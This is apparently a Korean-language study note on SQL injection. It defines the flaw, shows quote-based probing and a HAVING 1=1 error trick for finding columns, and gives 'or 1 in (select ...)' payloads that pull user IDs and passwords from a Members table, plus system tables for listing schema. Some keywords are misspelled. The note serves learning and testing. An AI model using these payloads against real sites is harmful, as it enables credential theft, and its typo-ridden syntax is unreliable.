
[SQL Injection]
공격자가 payload 등 DB에게 악성 쿼리를 요청하여 DB 정보를 탈취하는 과정에서 발생하는 취약점
Single quarter를 이용한 점검 방법
입력값을 넘기는 모든 부분에 대해서 '를 입력


소스코드 예시

![](../Images/Pasted%20image%2020261021151319.png)

'HAVNG  1 = 1 --
하면 num, user_id, passwd 칼럼 찾음

데이터 추출 가능한 것은 쿼리 : 'or 1 in (select user_id from Memebers where user_id > 0 ~~~ not in)

시도 1. '' or 1 in SELECT user_id from Members

![](../Images/Pasted%20image%2020261021164341.png)

'or 1 in (select user_id from Members where user_id > 0) --

![](../Images/Pasted%20image%2020261021164324.png)
'or 1 in (select passwd from Members where passwd > 0) --


꼭 알아야 하는 키워드(시스템 테이블, 시스템 컬럼)
sysobjects: Table의 정보가 담겨있는 테이블
=> Table 이름 컬럼 : name
ex_ select name from sysobject
syscloumns: clolumn의 정보가 담겨있는 테이블
-> column 이름 컬럼 : name

information_schema.tables: Table의 정보가 담겨 있는 테이블
information_schema.columns: column의 정보가 담겨 있는 테이블
